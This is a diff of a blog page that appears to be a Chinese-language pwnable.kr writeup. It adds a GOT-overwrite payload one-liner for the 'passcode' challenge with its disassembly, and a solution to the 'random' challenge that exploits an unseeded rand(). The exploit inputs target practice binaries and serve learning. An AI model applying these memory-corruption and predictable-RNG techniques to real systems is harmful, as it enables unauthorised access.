@@ -28,7 +28,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/juicymio.github.io\/pwnable\/"
-        },"genre": "posts","keywords": "pwn","wordcount":  1645 ,
+        },"genre": "posts","keywords": "pwn","wordcount":  2103 ,
         "url": "http:\/\/juicymio.github.io\/pwnable\/","datePublished": "2022-10-12T17:19:11+08:00","dateModified": "2022-10-12T17:19:11+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -102,8 +102,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Pwnable.kr</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>JuicyMio</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-10-12">2022-10-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1645 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-10-12">2022-10-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2103 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="true">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -118,6 +118,7 @@
         <li><a href="#实现">实现:</a></li>
       </ul>
     </li>
+    <li><a href="#6-random">6 random</a></li>
   </ul>
 </nav></div>
             </div><div class="content" id="content"><h1 id="pwnablekr-writeup">pwnable.kr writeup</h1>
@@ -526,29 +527,195 @@
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">.plt:08048460 ; =============== S U B R O U T I N E =======================================
-</span></span><span class="line"><span class="cl">.plt:08048460
-</span></span><span class="line"><span class="cl">.plt:08048460 ; Attributes: thunk
-</span></span><span class="line"><span class="cl">.plt:08048460
-</span></span><span class="line"><span class="cl">.plt:08048460 ; int system(const char *command)
-</span></span><span class="line"><span class="cl">.plt:08048460 _system         proc near               ; CODE XREF: login+86↓p
-</span></span><span class="line"><span class="cl">.plt:08048460
-</span></span><span class="line"><span class="cl">.plt:08048460 command         = dword ptr  4
-</span></span><span class="line"><span class="cl">.plt:08048460
-</span></span><span class="line"><span class="cl">.plt:08048460                 jmp     ds:off_804A010
-</span></span><span class="line"><span class="cl">.plt:08048460 _system         endp
-</span></span><span class="line"><span class="cl">.plt:08048460
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">.text:08048562 ; ---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">.text:08048563                 align 4
+</span></span><span class="line"><span class="cl">.text:08048564
+</span></span><span class="line"><span class="cl">.text:08048564 ; =============== S U B R O U T I N E =======================================
+</span></span><span class="line"><span class="cl">.text:08048564
+</span></span><span class="line"><span class="cl">.text:08048564 ; Attributes: bp-based frame
+</span></span><span class="line"><span class="cl">.text:08048564
+</span></span><span class="line"><span class="cl">.text:08048564                 public login
+</span></span><span class="line"><span class="cl">.text:08048564 login           proc near               ; CODE XREF: main+1A↓p
+</span></span><span class="line"><span class="cl">.text:08048564
+</span></span><span class="line"><span class="cl">.text:08048564 var_10          = dword ptr -10h
+</span></span><span class="line"><span class="cl">.text:08048564 var_C           = dword ptr -0Ch
+</span></span><span class="line"><span class="cl">.text:08048564
+</span></span><span class="line"><span class="cl">.text:08048564 ; __unwind {
+</span></span><span class="line"><span class="cl">.text:08048564                 push    ebp
+</span></span><span class="line"><span class="cl">.text:08048565                 mov     ebp, esp
+</span></span><span class="line"><span class="cl">.text:08048567                 sub     esp, 28h
+</span></span><span class="line"><span class="cl">.text:0804856A                 mov     eax, offset format ; &#34;enter passcode1 : &#34;
+</span></span><span class="line"><span class="cl">.text:0804856F                 mov     [esp], eax      ; format
+</span></span><span class="line"><span class="cl">.text:08048572                 call    _printf
+</span></span><span class="line"><span class="cl">.text:08048577                 mov     eax, offset aD  ; &#34;%d&#34;
+</span></span><span class="line"><span class="cl">.text:0804857C                 mov     edx, [ebp+var_10]
+</span></span><span class="line"><span class="cl">.text:0804857F                 mov     [esp+4], edx
+</span></span><span class="line"><span class="cl">.text:08048583                 mov     [esp], eax
+</span></span><span class="line"><span class="cl">.text:08048586                 call    ___isoc99_scanf
+</span></span><span class="line"><span class="cl">.text:0804858B                 mov     eax, ds:stdin@@GLIBC_2_0
+</span></span><span class="line"><span class="cl">.text:08048590                 mov     [esp], eax      ; stream
+</span></span><span class="line"><span class="cl">.text:08048593                 call    _fflush
+</span></span><span class="line"><span class="cl">.text:08048598                 mov     eax, offset aEnterPasscode2 ; &#34;enter passcode2 : &#34;
+</span></span><span class="line"><span class="cl">.text:0804859D                 mov     [esp], eax      ; format
+</span></span><span class="line"><span class="cl">.text:080485A0                 call    _printf
+</span></span><span class="line"><span class="cl">.text:080485A5                 mov     eax, offset aD  ; &#34;%d&#34;
+</span></span><span class="line"><span class="cl">.text:080485AA                 mov     edx, [ebp+var_C]
+</span></span><span class="line"><span class="cl">.text:080485AD                 mov     [esp+4], edx
+</span></span><span class="line"><span class="cl">.text:080485B1                 mov     [esp], eax
+</span></span><span class="line"><span class="cl">.text:080485B4                 call    ___isoc99_scanf
+</span></span><span class="line"><span class="cl">.text:080485B9                 mov     dword ptr [esp], offset s ; &#34;checking...&#34;
+</span></span><span class="line"><span class="cl">.text:080485C0                 call    _puts
+</span></span><span class="line"><span class="cl">.text:080485C5                 cmp     [ebp+var_10], 528E6h
+</span></span><span class="line"><span class="cl">.text:080485CC                 jnz     short loc_80485F1
+</span></span><span class="line"><span class="cl">.text:080485CE                 cmp     [ebp+var_C], 0CC07C9h
+</span></span><span class="line"><span class="cl">.text:080485D5                 jnz     short loc_80485F1
+</span></span><span class="line"><span class="cl">.text:080485D7                 mov     dword ptr [esp], offset aLoginOk ; &#34;Login OK!&#34;
+</span></span><span class="line"><span class="cl">.text:080485DE                 call    _puts
+</span></span><span class="line"><span class="cl">.text:080485E3                 mov     dword ptr [esp], offset command ; &#34;/bin/cat flag&#34;
+</span></span><span class="line"><span class="cl">.text:080485EA                 call    _system
+</span></span><span class="line"><span class="cl">.text:080485EF                 leave
+</span></span><span class="line"><span class="cl">.text:080485F0                 retn
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="实现">实现:</h3>
+</div><p>0x080485e3=134514147</p>
+<h3 id="实现">实现:</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;print &#34;A&#34;*96+&#34;</span><span class="se">\x00\xa0\x04\x08</span><span class="s1">&#34;+&#34;134514147</span><span class="se">\n</span><span class="s1">&#34;&#39;</span> <span class="o">|</span> <span class="o">./</span><span class="n">passcode</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="6-random">6 random</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">random</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">random</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>        <span class="c1">// random value!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">key</span> <span class="o">^</span> <span class="n">random</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Good!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Wrong, maybe you should try 2^32 cases.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意到<code>rand()</code>没有用<code>srand()</code>设定种子, 那么种子默认为1, 生成的随机数应该是一个固定的序列.
+我们在本地编译, 用gdb调试该程序, 得到random的值为1804289383.
+而key^random的值应该是0xdeadbeef, 由于^的逆运算是它本身, deadbeef^random=key.
+算出key = -1255736440, 运行random程序输入key得到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">random@pwnable:~$ ./random
+</span></span><span class="line"><span class="cl">-1255736440
+</span></span><span class="line"><span class="cl">Good!
+</span></span><span class="line"><span class="cl">Mommy, I thought libc random is unpredictable...
 </span></span></code></pre></td></tr></table>
 </div>
 </div></div><div class="post-footer" id="post-footer">
